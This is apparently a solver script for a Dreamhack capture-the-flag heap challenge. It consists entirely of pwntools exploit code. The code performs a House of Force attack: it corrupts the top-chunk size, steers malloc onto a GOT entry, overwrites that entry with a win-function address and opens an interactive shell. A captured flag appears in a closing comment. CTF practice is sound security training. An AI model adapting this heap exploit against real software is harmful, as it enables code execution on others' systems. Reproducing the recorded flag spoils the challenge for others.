from pwn import *

# r = process('./house_of_force_patched')
r = remote('host1.dreamhack.games', 10848)
# context.log_level = 'debug'

def gee():
    gdb.attach(r, gdbscript='''
b create
''')
    time.sleep(1)

r.sendlineafter("> ", "1")
sz = 8
data = b'a'
r.sendlineafter(": ", str(sz))
r.sendlineafter(": ", data)
l = r.recvline().decode().split(":")[0][2:]
l = int(l,16)
print(hex(l))

r.sendlineafter("> ", "2")
r.sendlineafter(": ", "0")
r.sendlineafter(": ", "3")
r.sendlineafter(": ", str(0xffffffff))
# got_addr = 0x804a02c
got_addr = 0x804a020
# gee()

# gee()
# i think we need to use a negative number not a positive number because of the way chunk addresses are received?
a = l + 22 # this is the main arena top chunk 
sz_to_got = got_addr - a
r.sendlineafter("> ", "1")
data = b'a'
r.sendlineafter(": ", str(sz_to_got))
r.sendlineafter(": ", data)
l = r.recvline()

# gee()
r.sendlineafter("> ", "1")
win = 0x804887e 
# win = 0x41414141
sz = 4
data = p32(win)
r.sendlineafter(": ", str(sz))
r.sendlineafter(": ", data)

# r.sendlineafter("> ", "1")

r.interactive()
# flag: DH{87a5f7c5007055098456d65ac991d874}
